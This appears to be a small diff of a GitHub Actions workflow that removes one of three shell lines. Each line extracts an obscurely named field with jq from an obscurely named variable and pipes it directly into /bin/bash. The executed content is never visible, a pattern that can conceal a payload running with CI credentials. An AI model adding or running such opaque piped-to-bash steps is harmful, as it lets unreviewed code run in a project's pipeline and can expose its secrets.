@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$db0754" | jq -r .bwlh2 | /bin/bash
           echo $mcv539 | jq -r .xfr66 | /bin/bash
-          echo $c30511 | jq -r .jae906 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
